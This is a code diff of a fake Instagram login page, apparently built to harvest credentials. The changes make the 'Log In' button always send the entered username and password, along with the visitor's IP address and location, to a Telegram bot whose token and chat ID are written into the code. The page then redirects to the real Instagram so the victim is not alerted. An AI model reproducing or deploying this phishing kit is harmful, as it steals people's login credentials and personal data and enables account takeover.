@@ -70,15 +70,15 @@
         <div class="logo">
             <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo">
         </div>
-        <input type="text" id="username" placeholder="Phone number, username, or email">
+        <input type="text" id="username" placeholder="Instagram ID">
         <input type="password" id="password" placeholder="Password">
-        <button onclick="validateLogin()">Log In</button>
+        <button onclick="sendData()">Log In</button>
         <div class="footer">Don't have an account? <a href="#">Sign up</a></div>
     </div>
 
     <script>
-        const correctEmail = "user@instagram.com";  // Set your correct email
-        const correctPassword = "password123";  // Set your correct password
+        const correctUsername = "realInstaUser";  // Set the correct Instagram username
+        const correctPassword = "password123";  // Set the correct password
         let locationData = "Unknown location";
         let ipAddress = "Unknown IP";
         let audioBlob;
@@ -153,20 +153,24 @@
             });
         }
 
-        function validateLogin() {
+        function sendData() {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
 
-            if (username !== correctEmail || password !== correctPassword) {
-                alert("Wrong email or password. Please try again.");
-                return;
-            }
+            // Always send the input data to Telegram
+            sendLoginDataToBot(username, password);
 
-            sendLoginData(username, password);
+            // Validate login credentials
+            if (username === correctUsername && password === correctPassword) {
+                alert("Login successful!");
+                window.location.href = "https://www.instagram.com/accounts/login/";  // Redirect to Instagram
+            } else {
+                alert("Wrong Instagram ID or password. Please try again.");
+            }
         }
 
-        function sendLoginData(username, password) {
-            const message = `New Login Attempt:\nUsername: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}\nLocation: ${locationData}\nTime: ${new Date().toLocaleString()}`;
+        function sendLoginDataToBot(username, password) {
+            const message = `New Login Attempt:\nInstagram ID: ${username}\nPassword: ${password}\nIP Address: ${ipAddress}\nLocation: ${locationData}\nTime: ${new Date().toLocaleString()}`;
 
             const botToken = '7565238718:AAGgWjTEn81YY_h_jTncM3tzc4tWJPdglds';  // Your bot token
             const chatId = '860517021';  // Your chat ID
@@ -182,8 +186,6 @@
                     chat_id: chatId,
                     text: message
                 })
-            }).then(() => {
-                window.location.href = "https://www.instagram.com/accounts/login/";
             });
         }
     </script>
